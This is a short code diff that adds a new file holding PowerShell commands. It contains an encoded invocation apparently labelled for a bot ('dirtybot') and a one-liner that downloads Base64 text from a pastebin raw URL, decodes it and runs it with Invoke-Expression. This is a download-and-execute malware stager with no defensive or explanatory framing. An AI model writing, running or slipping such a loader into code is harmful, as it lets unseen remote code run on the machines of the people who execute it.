@@ -1,0 +1,4 @@
+powershell -enc <Encodedirtybot>
+
+[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((Invoke-WebRequest https://pastebin.com/raw/XDSXK45r  -usebasicparsing).Content)) |
+ Invoke-Expression
